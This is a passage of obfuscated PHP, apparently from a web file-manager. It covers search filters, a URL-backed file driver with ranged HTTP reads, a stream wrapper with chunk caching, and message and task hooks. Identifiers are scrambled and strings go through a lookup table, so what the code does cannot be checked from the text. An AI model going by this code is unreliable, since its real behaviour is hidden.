$ÕØ÷ëÖê[$Ø˘◊àëØ[494]] . $Ø˘◊àëØ[50])) { return !1; } } if (isset($ÕØ÷ëÖê[$Ø˘◊àëØ[2231]]) && $ÕØ÷ëÖê[$Ø˘◊àëØ[2231]] < $™ùíå…‰[$Ø˘◊àëØ[79]]) { return !1; } if (isset($ÕØ÷ëÖê[$Ø˘◊àëØ[2232]]) && $ÕØ÷ëÖê[$Ø˘◊àëØ[2232]] > $™ùíå…‰[$Ø˘◊àëØ[79]]) { return !1; } if (isset($ÕØ÷ëÖê[$Ø˘◊àëØ[670]]) && $ÕØ÷ëÖê[$Ø˘◊àëØ[670]] != $™ùíå…‰[$Ø˘◊àëØ[537]]) { return !1; } return !0; } public function listSearchChildren($ˆÕã‚–˘, $¿Ã•„±ú = 5000) { $Ûîé£è =& $_SERVER[ß⁄ˆÇ†Œ]; $Ùó‡°∫ú = array(); $™‚¶’î€ = $this->sourceInfo($ˆÕã‚–˘); $ùÜ∞Øﬁ§ = array($Ûîé£è[592] => array($Ûîé£è[467], $™‚¶’î€[$Ûîé£è[592]] . $™‚¶’î€[$Ûîé£è[193]] . $Ûîé£è[621])); $‹ëÔÿ˘∞ = $this->field($Ûîé£è[79])->where($ùÜ∞Øﬁ§)->limit($¿Ã•„±ú + 1)->select(); $ﬂ”ôé ß = is_array($‹ëÔÿ˘∞) ? count($‹ëÔÿ˘∞) : 0; if ($ﬂ”ôé ß > $¿Ã•„±ú) { return $this->_listSearchChildrenNear($ˆÕã‚–˘, $¿Ã•„±ú); } $÷ïÄ…öÈ = $this->field($Ûîé£è[193])->where($ùÜ∞Øﬁ§)->select(); $Ùó‡°∫ú = array_to_keyvalue($÷ïÄ…öÈ, $Ûîé£è[12], $Ûîé£è[193]); return $Ùó‡°∫ú; } private function _listSearchChildrenNear($Ü¨‰‘†¿, $Œ—‚ü∏¶) { $∑¬—ã©ß =& $_SERVER[ß⁄ˆÇ†Œ]; $áÈ·æªØ = array(); $‹ïÑúôÇ = array($∑¬—ã©ß[192] => $Ü¨‰‘†¿); $ÿ√≈Ã÷Ÿ = $this->field($∑¬—ã©ß[2233])->where($‹ïÑúôÇ)->select(); $íÓ™§ïˆ = array_to_keyvalue(array_filter_by_field($ÿ√≈Ã÷Ÿ, $∑¬—ã©ß[493], $∑¬—ã©ß[91]), $∑¬—ã©ß[12], $∑¬—ã©ß[193]); $áÈ·æªØ = array_merge($áÈ·æªØ, array_to_keyvalue($ÿ√≈Ã÷Ÿ, $∑¬—ã©ß[12], $∑¬—ã©ß[193])); if (!$íÓ™§ïˆ) { return $áÈ·æªØ; } $‹ïÑúôÇ = array($∑¬—ã©ß[192] => array($∑¬—ã©ß[7], $íÓ™§ïˆ)); $ÿ√≈Ã÷Ÿ = $this->field($∑¬—ã©ß[2233])->where($‹ïÑúôÇ)->limit($Œ—‚ü∏¶)->select(); $áÈ·æªØ = array_merge($áÈ·æªØ, array_to_keyvalue($ÿ√≈Ã÷Ÿ, $∑¬—ã©ß[12], $∑¬—ã©ß[193])); $áÈ·æªØ = array_slice($áÈ·æªØ, 0, intval($Œ—‚ü∏¶)); return $áÈ·æªØ; } private function _listSearchBindPinyin($ñˆ÷‰˘, &$òí·î—Å, &$Õà»™ﬁú) { $›õ’áƒ› =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($ñˆ÷‰˘[$›õ’áƒ›[2061]]) || !$ñˆ÷‰˘[$›õ’áƒ›[2061]]) { return; } if (!Input::check($ñˆ÷‰˘[$›õ’áƒ›[2061]], $›õ’áƒ›[403]) || strlen($ñˆ÷‰˘[$›õ’áƒ›[2061]]) < 2) { return; } $ûÃ°Ñô¸ = "\x4c\105\106\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\151\157\137\163\x6f\165\162\143\145\137\155\x65\164\141\x20\155\145\x74\141\40\x6f\x6e\40\x73\157\165\162\x63\145\56\163\x6f\x75\162\x63\145\x49\104\x20\75\40\x6d\145\164\x61\56\x73\x6f\165\162\x63\145\111\x44"; $⁄´Æê≠” = array(); $Õà»™ﬁú = str_replace(array($›õ’áƒ›[262], $›õ’áƒ›[53], $›õ’áƒ›[2234]), $›õ’áƒ›[12], $Õà»™ﬁú); $Õà»™ﬁú = $›õ’áƒ›[519] . str_replace($›õ’áƒ›[50], $›õ’áƒ›[520], $Õà»™ﬁú); $≠ ÅÇº™ = $òí·î—Å[$›õ’áƒ›[32]]; unset($òí·î—Å[$›õ’áƒ›[32]]); foreach ($òí·î—Å as $çÓıÑç˘ => $ ≠Ø˜∏í) { $⁄´Æê≠”[$›õ’áƒ›[519] . $çÓıÑç˘] = $ ≠Ø˜∏í; } foreach ($≠ ÅÇº™ as $ﬂèßœÓÔ) { $⁄´Æê≠”[] = array($›õ’áƒ›[524] => $ﬂèßœÓÔ, $›õ’áƒ›[1074] => $›õ’áƒ›[2065], array($›õ’áƒ›[2235] => $ﬂèßœÓÔ, $›õ’áƒ›[2236] => array($›õ’áƒ›[7], array($›õ’áƒ›[546], $›õ’áƒ›[545])))); } $this->join($ûÃ°Ñô¸); $òí·î—Å = $⁄´Æê≠”; } private function _parseSearchWhere($£œåÍ√ï) { $¬ˆÜÓ¯˜ =& $_SERVER[ß⁄ˆÇ†Œ]; $“ª˘Ö´Ñ = array(); if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[833]]) && $£œåÍ√ï[$¬ˆÜÓ¯˜[833]]) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[88]] = array($¬ˆÜÓ¯˜[2237], $£œåÍ√ï[$¬ˆÜÓ¯˜[833]]); } if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[834]]) && $£œåÍ√ï[$¬ˆÜÓ¯˜[834]]) { $±ü´Ñèã = array($¬ˆÜÓ¯˜[2238], $£œåÍ√ï[$¬ˆÜÓ¯˜[834]]); if ($“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[88]]) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[88]] = array($“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[88]], $±ü´Ñèã, $¬ˆÜÓ¯˜[2239]); } else { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[88]] = $±ü´Ñèã; } } if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[2231]]) && $£œåÍ√ï[$¬ˆÜÓ¯˜[2231]] > 0) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[79]] = array($¬ˆÜÓ¯˜[2237], $£œåÍ√ï[$¬ˆÜÓ¯˜[2231]]); } if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[2232]]) && $£œåÍ√ï[$¬ˆÜÓ¯˜[2232]]) { $±ü´Ñèã = array($¬ˆÜÓ¯˜[2238], $£œåÍ√ï[$¬ˆÜÓ¯˜[2232]]); if ($“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[79]]) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[79]] = array($“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[79]], $±ü´Ñèã, $¬ˆÜÓ¯˜[2239]); } else { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[79]] = $±ü´Ñèã; } } if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[670]]) && $£œåÍ√ï[$¬ˆÜÓ¯˜[670]]) { $“ª˘Ö´Ñ[] = array($¬ˆÜÓ¯˜[537] => $£œåÍ√ï[$¬ˆÜÓ¯˜[670]], $¬ˆÜÓ¯˜[535] => $£œåÍ√ï[$¬ˆÜÓ¯˜[670]], $¬ˆÜÓ¯˜[1074] => $¬ˆÜÓ¯˜[2065]); } if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[494]]) && $£œåÍ√ï[$¬ˆÜÓ¯˜[494]]) { $ÿˆ°„ÊÆ = $£œåÍ√ï[$¬ˆÜÓ¯˜[494]]; if ($ÿˆ°„ÊÆ == $¬ˆÜÓ¯˜[78]) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[493]] = 1; } else { if ($ÿˆ°„ÊÆ == $¬ˆÜÓ¯˜[2240]) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[493]] = 0; } else { if ($ÿˆ°„ÊÆ) { $ÿˆ°„ÊÆ = is_array($ÿˆ°„ÊÆ) ? $ÿˆ°„ÊÆ : explode($¬ˆÜÓ¯˜[50], $ÿˆ°„ÊÆ); $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[494]] = array($¬ˆÜÓ¯˜[500], $ÿˆ°„ÊÆ); $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[493]] = 0; } } } } $this->_parseSearchParent($£œåÍ√ï, $“ª˘Ö´Ñ); if (isset($£œåÍ√ï[$¬ˆÜÓ¯˜[2061]]) && trim($£œåÍ√ï[$¬ˆÜÓ¯˜[2061]])) { $ãŒ•‘Ö¸ = trim($£œåÍ√ï[$¬ˆÜÓ¯˜[2061]]); $¢£îé‘Ì = explode($¬ˆÜÓ¯˜[53], $ãŒ•‘Ö¸); if (strlen($ãŒ•‘Ö¸) > 2 && (substr($ãŒ•‘Ö¸, 0, 1) == $¬ˆÜÓ¯˜[121] && substr($ãŒ•‘Ö¸, -1) == $¬ˆÜÓ¯˜[121]) || substr($ãŒ•‘Ö¸, 0, 1) == $¬ˆÜÓ¯˜[58] && substr($ãŒ•‘Ö¸, -1) == $¬ˆÜÓ¯˜[58]) { $ãŒ•‘Ö¸ = substr($ãŒ•‘Ö¸, 1, -1); $¢£îé‘Ì = array($ãŒ•‘Ö¸); } $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[32]] = array(array($¬ˆÜÓ¯˜[620], $¬ˆÜÓ¯˜[2063] . $ãŒ•‘Ö¸ . $¬ˆÜÓ¯˜[2063])); if (count($¢£îé‘Ì) > 1) { $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[32]] = array(); foreach ($¢£îé‘Ì as $ê˜©Âúë) { if (!trim($ê˜©Âúë)) { continue; } $“ª˘Ö´Ñ[$¬ˆÜÓ¯˜[32]][] = array($¬ˆÜÓ¯˜[620], $¬ˆÜÓ¯˜[2063] . trim($ê˜©Âúë) . $¬ˆÜÓ¯˜[2063]); } } } return $“ª˘Ö´Ñ; } private function _parseSearchParent($‰Î˝ó±±, &$≤æÇÏ™ó) { $⁄•‘¬Ì„ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($‰Î˝ó±±[$⁄•‘¬Ì„[192]]) || !$‰Î˝ó±±[$⁄•‘¬Ì„[192]]) { return; } $ı·ãûÜï = $this->pathInfo($‰Î˝ó±±[$⁄•‘¬Ì„[192]]); $Çã–˜áí = $ı·ãûÜï[$⁄•‘¬Ì„[192]] . $⁄•‘¬Ì„[12] === $⁄•‘¬Ì„[228]; $∞£§∆†ı = $ı·ãûÜï[$⁄•‘¬Ì„[190]] == $⁄•‘¬Ì„[586]; if ($ı·ãûÜï[$⁄•‘¬Ì„[603]] == $⁄•‘¬Ì„[604]) { $Êﬂçﬂ«í = $this->sourceInfo($‰Î˝ó±±[$⁄•‘¬Ì„[192]]); $ı·ãûÜï[$⁄•‘¬Ì„[592]] = $Êﬂçﬂ«í[$⁄•‘¬Ì„[592]]; } $≤æÇÏ™ó[$⁄•‘¬Ì„[660]] = array($⁄•‘¬Ì„[620], $ı·ãûÜï[$⁄•‘¬Ì„[592]] . $‰Î˝ó±±[$⁄•‘¬Ì„[192]] . $⁄•‘¬Ì„[621]); $£ÁÎ≈é¶ = isset($‰Î˝ó±±[$⁄•‘¬Ì„[1921]]) && in_array($⁄•‘¬Ì„[586], $‰Î˝ó±±[$⁄•‘¬Ì„[1921]]); if (!$£ÁÎ≈é¶ || !$∞£§∆†ı || !$Çã–˜áí || !$ı·ãûÜï[$⁄•‘¬Ì„[495]]) { return; } if (!AuthModel::authCheckRoot($ı·ãûÜï[$⁄•‘¬Ì„[495]][$⁄•‘¬Ì„[496]])) { return; } $∏≤ Â»á = $ı·ãûÜï[$⁄•‘¬Ì„[577]] . $⁄•‘¬Ì„[12]; if ($∏≤ Â»á == $⁄•‘¬Ì„[91]) { unset($≤æÇÏ™ó[$⁄•‘¬Ì„[660]]); $≤æÇÏ™ó[$⁄•‘¬Ì„[190]] = self::TYPE_GROUP; return; } $Ä›ÃÉÒ◊ = Model($⁄•‘¬Ì„[593])->groupChildrenAll($∏≤ Â»á); $˜ï⁄˛ìÃ = count($Ä›ÃÉÒ◊); if ($˜ï⁄˛ìÃ <= 1) { return; } $ª—ùÜ€¸ = array($⁄•‘¬Ì„[192] => 0, $⁄•‘¬Ì„[190] => self::TYPE_GROUP, $⁄•‘¬Ì„[577] => array($⁄•‘¬Ì„[7], $Ä›ÃÉÒ◊)); $˜ÜÓ´·  = $this->field($⁄•‘¬Ì„[2241])->where($ª—ùÜ€¸)->limit($˜ï⁄˛ìÃ)->select(); $≤æÇÏ™ó[$⁄•‘¬Ì„[660]] = array(); foreach ($˜ÜÓ´·  as $Óôƒı©ª) { $≤æÇÏ™ó[$⁄•‘¬Ì„[660]][] = array($⁄•‘¬Ì„[620], $⁄•‘¬Ì„[602] . $Óôƒı©ª[$⁄•‘¬Ì„[193]] . $⁄•‘¬Ì„[621]); } $≤æÇÏ™ó[$⁄•‘¬Ì„[660]][] = $⁄•‘¬Ì„[2065]; } } goto b–À‰°è´¯; eÜ¥∆®Ç«÷: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($≈òÿÕîË = false) { } public function exist($Ÿ√∏√Õë) { $∫ÀÖ⁄Ω“ = $this->info($Ÿ√∏√Õë); return $∫ÀÖ⁄Ω“[$_SERVER[ß⁄ˆÇ†Œ][232]]; } public function isFile($æ”Á…Îı) { $¨í·ÓÆ° = $this->info($æ”Á…Îı); return $¨í·ÓÆ°[$_SERVER[ß⁄ˆÇ†Œ][232]]; } public function isFolder($• —¬Ü“) { return !1; } public function size($⁄ù˝ô√’) { $ºï€µËÀ = $this->info($⁄ù˝ô√’); return $ºï€µËÀ[$_SERVER[ß⁄ˆÇ†Œ][79]]; } public function info($ùˆÌñ¸º) { return $this->infoParse($ùˆÌñ¸º); } public function infoAuth($ªÜùëÑÕ) { return $this->infoParse($ªÜùëÑÕ); } public function infoWithChildren($†ò∑éÔª) { return $this->infoParse($†ò∑éÔª); } public function infoFull($ç·¯÷∞è) { return $this->infoParse($ç·¯÷∞è); } private function infoParse($∆§ã–∏∑) { $ﬁŸÊ◊éÀ =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬂŒﬁÇÚÅ = $this->header($∆§ã–∏∑); if (!$ﬂŒﬁÇÚÅ || !$ﬂŒﬁÇÚÅ[$ﬁŸÊ◊éÀ[823]]) { return !1; } $≥ ∑Õ€° = _get($ﬂŒﬁÇÚÅ, $ﬁŸÊ◊éÀ[422], 0); $ö¬ö˝∆≈ = array($ﬁŸÊ◊éÀ[32] => $ﬂŒﬁÇÚÅ[$ﬁŸÊ◊éÀ[32]], $ﬁŸÊ◊éÀ[87] => $∆§ã–∏∑, $ﬁŸÊ◊éÀ[33] => $ﬁŸÊ◊éÀ[230], $ﬁŸÊ◊éÀ[79] => intval($≥ ∑Õ€°), $ﬁŸÊ◊éÀ[169] => get_path_ext($ﬂŒﬁÇÚÅ[$ﬁŸÊ◊éÀ[32]]), $ﬁŸÊ◊éÀ[1449] => $≥ ∑Õ€° > 0 && $ﬂŒﬁÇÚÅ[$ﬁŸÊ◊éÀ[1599]], $ﬁŸÊ◊éÀ[1450] => !1); return $ö¬ö˝∆≈; } private function header($ôâòÎè˘) { $˚Œéÿò‚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset(self::$_cacheHeader[$ôâòÎè˘])) { return self::$_cacheHeader[$ôâòÎè˘]; } $ÙÀ¯∏®£ = isset($GLOBALS[$˚Œéÿò‚[1600]]) ? $GLOBALS[$˚Œéÿò‚[1600]] : !1; $GLOBALS[$˚Œéÿò‚[1600]] = !0; self::$_cacheHeader[$ôâòÎè˘] = url_header($ôâòÎè˘); $GLOBALS[$˚Œéÿò‚[1600]] = $ÙÀ¯∏®£; return self::$_cacheHeader[$ôâòÎè˘]; } public function hashSimple($¶˛ƒºÖ¢, $¡¡éØµ˙ = false) { $»›∆£æÄ =& $_SERVER[ß⁄ˆÇ†Œ]; $£Éˆπò¿ = $this->info($¶˛ƒºÖ¢); if (!$£Éˆπò¿ || !$£Éˆπò¿[$»›∆£æÄ[232]]) { return !1; } $⁄‹˚⁄¯ä = $£Éˆπò¿[$»›∆£æÄ[79]]; $¬‚Æ®≤ﬂ = 200; $˚˙˚˝÷õ = 50; if ($⁄‹˚⁄¯ä <= $¬‚Æ®≤ﬂ * $˚˙˚˝÷õ) { return md5($this->fileSubstr($¶˛ƒºÖ¢, 0, $⁄‹˚⁄¯ä)) . $⁄‹˚⁄¯ä; } $òßì•ëÀ = intval($⁄‹˚⁄¯ä / $˚˙˚˝÷õ); $Çß»œﬁ⁄ = $»›∆£æÄ[12]; $ΩÿÅ©™≤ = timeFloat(); $Çó¯◊Í¸ = 15; for ($‚˝Ø±åã = 0; $‚˝Ø±åã < $˚˙˚˝÷õ; $‚˝Ø±åã++) { if (timeFloat() - $ΩÿÅ©™≤ > $Çó¯◊Í¸) { return !1; } $¨ÕÓ¸Ù€ = $this->fileSubstr($¶˛ƒºÖ¢, $òßì•ëÀ * $‚˝Ø±åã, $¬‚Æ®≤ﬂ); if (!$¨ÕÓ¸Ù€) { return !1; } $Çß»œﬁ⁄ .= $¨ÕÓ¸Ù€; } $Çß»œﬁ⁄ .= $this->fileSubstr($¶˛ƒºÖ¢, $⁄‹˚⁄¯ä - $¬‚Æ®≤ﬂ, $¬‚Æ®≤ﬂ); return md5($Çß»œﬁ⁄) . $⁄‹˚⁄¯ä; } public function getContent($ÓÜèÒ˛Ü) { return $this->fileSubstr($ÓÜèÒ˛Ü); } public function fileSubstr($´ˆŸŸåÜ, $˛”‹¿Çø = 0, $∆œ”Çßÿ = -1) { $·—óˆ√ó =& $_SERVER[ß⁄ˆÇ†Œ]; $ï÷ØÅ˜À = $this->info($´ˆŸŸåÜ); if (!$ï÷ØÅ˜À || !$ï÷ØÅ˜À[$·—óˆ√ó[232]] && $ï÷ØÅ˜À[$·—óˆ√ó[79]] > 1024 * 1024 * 10) { return !1; } if ($∆œ”Çßÿ === -1) { $∆œ”Çßÿ = $ï÷ØÅ˜À[$·—óˆ√ó[79]]; } if ($∆œ”Çßÿ == 0) { return $·—óˆ√ó[12]; } $∑õªﬁ È = array($·—óˆ√ó[1601] . $˛”‹¿Çø . $·—óˆ√ó[858] . ($˛”‹¿Çø + $∆œ”Çßÿ - 1)); $êÑóÇ¶Ô = url_request($´ˆŸŸåÜ, $·—óˆ√ó[261], !1, $∑õªﬁ È, !1, !1, 30); return $êÑóÇ¶Ô[$·—óˆ√ó[1283]] ? $êÑóÇ¶Ô[$·—óˆ√ó[1283]] : $·—óˆ√ó[12]; } public function download($ŸÇäÿ±ﬁ, $⁄˝⁄úÓì) { Downloader::start($ŸÇäÿ±ﬁ, $⁄˝⁄úÓì); return $⁄˝⁄úÓì; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($‹Êÿ–∏ÿ, $˛±ƒ˙Ãò = '') { $this->info = $this->info($‹Êÿ–∏ÿ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ß⁄ˆÇ†Œ][87]]; $this->pathOpen = $‹Êÿ–∏ÿ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$‹Êÿ–∏ÿ])) { self::$_chunkBuffer[$‹Êÿ–∏ÿ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($º„¨Ê˝ ) { $ß±»…„Ü = $this->fileSubstr($this->pose, $º„¨Ê˝ ); $this->pose += strlen($ß±»…„Ü); return $ß±»…„Ü; } public function stream_tell() { return $this->pose; } public function stream_seek($»‰◊¬ä⁄, $Üî≈Ã˝√) { $∏√…‹«Ô =& $_SERVER[ß⁄ˆÇ†Œ]; if ($Üî≈Ã˝√ == SEEK_SET) { $this->pose = $»‰◊¬ä⁄; } else { if ($Üî≈Ã˝√ == SEEK_CUR) { $this->pose += $»‰◊¬ä⁄; } else { if ($Üî≈Ã˝√ == SEEK_END) { $this->pose = $this->info[$∏√…‹«Ô[79]] + intval($»‰◊¬ä⁄); } } } if ($»‰◊¬ä⁄ < 0) { $this->pose = $this->info[$∏√…‹«Ô[79]] + $»‰◊¬ä⁄; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ß⁄ˆÇ†Œ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÂßøÖ§Ì, $É…ú≤¶®) { $„‡ÇºÌ‚ =& $_SERVER[ß⁄ˆÇ†Œ]; $«µ›Ééè = $this->info($ÂßøÖ§Ì); return array($„‡ÇºÌ‚[1602] => 0, $„‡ÇºÌ‚[1603] => 0, $„‡ÇºÌ‚[16] => 32768 + 511, $„‡ÇºÌ‚[1604] => 0, $„‡ÇºÌ‚[1605] => 0, $„‡ÇºÌ‚[1606] => 0, $„‡ÇºÌ‚[1607] => 0, $„‡ÇºÌ‚[79] => $«µ›Ééè[$„‡ÇºÌ‚[79]], $„‡ÇºÌ‚[1608] => $«µ›Ééè[$„‡ÇºÌ‚[1448]], $„‡ÇºÌ‚[1564] => $«µ›Ééè[$„‡ÇºÌ‚[88]], $„‡ÇºÌ‚[1563] => $«µ›Ééè[$„‡ÇºÌ‚[231]], $„‡ÇºÌ‚[1609] => 0, $„‡ÇºÌ‚[1610] => 0); } static $fileInfo = array(); public function info($’ìì∏û∫) { $»–‰⁄∏ö = $_SERVER[ß⁄ˆÇ†Œ][1611]; if (isset(self::$fileInfo[$’ìì∏û∫])) { return self::$fileInfo[$’ìì∏û∫]; } if (substr($’ìì∏û∫, 0, strlen($»–‰⁄∏ö)) != $»–‰⁄∏ö) { return !1; } self::$fileInfo[$’ìì∏û∫] = IO::info(substr($’ìì∏û∫, strlen($»–‰⁄∏ö))); return self::$fileInfo[$’ìì∏û∫]; } public static function read($¢˘â¬Ü¡, $ü˚Èû´ã, $·ı÷‘ÇÛ) { if (!isset(self::$_fopenCache[$¢˘â¬Ü¡])) { $áÎîÒÁ± = new StreamWrapperIO(); $áÎîÒÁ±->stream_open($¢˘â¬Ü¡); self::$_fopenCache[$¢˘â¬Ü¡] = $áÎîÒÁ±; } $áÎîÒÁ± = self::$_fopenCache[$¢˘â¬Ü¡]; return $áÎîÒÁ±->fileSubstr($ü˚Èû´ã, $·ı÷‘ÇÛ); } public static function _read($ä≠ùÊıÉ, $¢°—¬ï∆, $µÉ÷ì’á) { $ä⁄±∏óø =& $_SERVER[ß⁄ˆÇ†Œ]; $çç≠‡Ã€ = fopen($ä≠ùÊıÉ, $ä⁄±∏óø[1452]); if (!$çç≠‡Ã€) { return $ä⁄±∏óø[12]; } $âì∆≥çÍ = 8192; fseek($çç≠‡Ã€, $¢°—¬ï∆, SEEK_SET); $ªÊ£¿∆é = $ä⁄±∏óø[12]; $ª®®°´≠ = 0; while ($ª®®°´≠ < $µÉ÷ì’á) { $¸˛‘˘äë = min($âì∆≥çÍ, $µÉ÷ì’á - $ª®®°´≠); $ªÊ£¿∆é .= fread($çç≠‡Ã€, $¸˛‘˘äë); $ª®®°´≠ += $¸˛‘˘äë; } fclose($çç≠‡Ã€); return $ªÊ£¿∆é; } public function fileSubstr($ó∞ô‹ñç, $ˆÀ¢Öπ˝) { $ßÅ‚∞ﬁà =& $_SERVER[ß⁄ˆÇ†Œ]; $ÊÑËúíß = $this->info[$ßÅ‚∞ﬁà[79]]; $‰›≥∑µ¬ = $ó∞ô‹ñç; $Ó¥±å‚Ò = $ˆÀ¢Öπ˝; if ($ó∞ô‹ñç < 0) { $ó∞ô‹ñç = $ÊÑËúíß + $ó∞ô‹ñç; } if ($ˆÀ¢Öπ˝ === !1) { $ˆÀ¢Öπ˝ = $ÊÑËúíß - $ó∞ô‹ñç; } if ($ó∞ô‹ñç + $ˆÀ¢Öπ˝ > $ÊÑËúíß) { $ˆÀ¢Öπ˝ = $ÊÑËúíß - $ó∞ô‹ñç; } if ($ˆÀ¢Öπ˝ <= 0) { return $ßÅ‚∞ﬁà[12]; } if ($ó∞ô‹ñç < 0 || $ó∞ô‹ñç >= $ÊÑËúíß || $ˆÀ¢Öπ˝ <= 0 || $ˆÀ¢Öπ˝ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\x6c\x65\x52\x65\141\x64\40\145\162\x72\157\162\x21\x20\x73\x74\141\x72\x74\x3d{$ó∞ô‹ñç}\73\x6c\x65\x6e\x67\x74\x68\x3d{$ˆÀ¢Öπ˝}\73\40\163\151\172\145\x3d{$ÊÑËúíß}\73"); } $ì™ïè†∞ = 64 * 1024; $Ó’˜¢Í =& self::$_chunkBuffer[$this->path]; if (!$Ó’˜¢Í) { $Ó’˜¢Í = array(); } $ó≠êˆæÛ = 0; $ìæ¸ü®‹ = 0; $‡ÂË˛å∑ = $ßÅ‚∞ﬁà[12]; foreach ($Ó’˜¢Í as $ó≠êˆæÛ => $‡ÂË˛å∑) { $ó≠êˆæÛ = intval($ó≠êˆæÛ); $ìæ¸ü®‹ = $ó≠êˆæÛ + strlen($‡ÂË˛å∑); if ($ó∞ô‹ñç >= $ìæ¸ü®‹) { continue; } if ($ó∞ô‹ñç >= $ó≠êˆæÛ && $ó∞ô‹ñç + $ˆÀ¢Öπ˝ <= $ìæ¸ü®‹) { return substr($‡ÂË˛å∑, $ó∞ô‹ñç - $ó≠êˆæÛ, $ˆÀ¢Öπ˝); } break; } if (count($Ó’˜¢Í) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ßÅ‚∞ﬁà[1612], $ßÅ‚∞ﬁà[1613] . count($Ó’˜¢Í) . "\73\x73\x74\141\162\x74\75{$ó∞ô‹ñç}\54\x6c\145\156\147\x74\150\75{$ˆÀ¢Öπ˝}\73\160\x6f\163\x65\x3a{$ó≠êˆæÛ}\176{$ìæ¸ü®‹}"); throw new Exception($ßÅ‚∞ﬁà[1614]); } $âÁ¡Ê„Ä = intval($ó∞ô‹ñç / $ì™ïè†∞) * $ì™ïè†∞; $¨‹±ÏÊì = ceil(($ó∞ô‹ñç + $ˆÀ¢Öπ˝) / $ì™ïè†∞) * $ì™ïè†∞ - $âÁ¡Ê„Ä; $∑á°ªº = IO::fileSubstr($this->path, $âÁ¡Ê„Ä, $¨‹±ÏÊì); $Ó’˜¢Í[$âÁ¡Ê„Ä . $ßÅ‚∞ﬁà[12]] = $∑á°ªº; ksort($Ó’˜¢Í); $Èï⁄˝àò = substr($∑á°ªº, $ó∞ô‹ñç - $âÁ¡Ê„Ä, $ˆÀ¢Öπ˝); return $Èï⁄˝àò; } private function log($°Ç‚√ÈÑ, $Ç∂â˘∏ö) { $®ã⁄”π® =& $_SERVER[ß⁄ˆÇ†Œ]; $ã∆≠Ã‡Œ = timeFloat() - $this->timeStart; write_log(sprintf($®ã⁄”π®[1615], $°Ç‚√ÈÑ, $this->info[$®ã⁄”π®[32]], $ã∆≠Ã‡Œ, $Ç∂â˘∏ö), $®ã⁄”π®[1260]); } } class Message { function __construct() { } public function send($ûéœÉ… = '', $º˚„Üé◊ = array(), $¶í®å·‰ = "\x74\x65\x78\x74") { $¢Ø∞¿–à =& $_SERVER[ß⁄ˆÇ†Œ]; $™˙åÂÿ§ = array($¢Ø∞¿–à[33] => $¢Ø∞¿–à[1616], $¢Ø∞¿–à[171] => $ûéœÉ…); if (in_array($¶í®å·‰, array($¢Ø∞¿–à[1616], $¢Ø∞¿–à[1617]))) { $™˙åÂÿ§[$¢Ø∞¿–à[33]] = $¶í®å·‰; } $º˚„Üé◊ = array($¢Ø∞¿–à[586] => isset($º˚„Üé◊[$¢Ø∞¿–à[586]]) ? $º˚„Üé◊[$¢Ø∞¿–à[586]] : $¢Ø∞¿–à[12], $¢Ø∞¿–à[670] => isset($º˚„Üé◊[$¢Ø∞¿–à[670]]) ? $º˚„Üé◊[$¢Ø∞¿–à[670]] : $¢Ø∞¿–à[12]); if (empty($ûéœÉ…) || empty($º˚„Üé◊[$¢Ø∞¿–à[586]]) && empty($º˚„Üé◊[$¢Ø∞¿–à[670]])) { return !1; } $Ù≠≤¯•ë = array($¢Ø∞¿–à[1544] => $™˙åÂÿ§, $¢Ø∞¿–à[1618] => $º˚„Üé◊); Hook::trigger($¢Ø∞¿–à[1619], $Ù≠≤¯•ë); } } goto bØïÙùŸ∑—; FÂÕ¨ˆÖª¶: class TaskHttp extends Task { protected function startAfter() { $∞é’ä˛‰ =& $_SERVER[ß⁄ˆÇ†Œ]; $„Ñ”ÊÅ∏ =& $this->task; $„Ñ”ÊÅ∏[$∞é’ä˛‰[1841]] = 1; Hook::bind($∞é’ä˛‰[1809], array($this, $∞é’ä˛‰[1842])); Hook::bind($∞é’ä˛‰[1811], array($this, $∞é’ä˛‰[1843])); Hook::bind($∞é’ä˛‰[1813], array($this, $∞é’ä˛‰[1844])); } protected function endAfter() { $¢ﬁÂæœç =& $_SERVER[ß⁄ˆÇ†Œ]; Hook::unbind($¢ﬁÂæœç[1809], array($this, $¢ﬁÂæœç[1842])); Hook::unbind($¢ﬁÂæœç[1811], array($this, $¢ﬁÂæœç[1843])); Hook::unbind($¢ﬁÂæœç[1813], array($this, $¢ﬁÂæœç[1844])); } public function progressStart($∂€õ˘ßó) { $˚ø˛≤ÒÁ =& $_SERVER[ß⁄ˆÇ†Œ]; 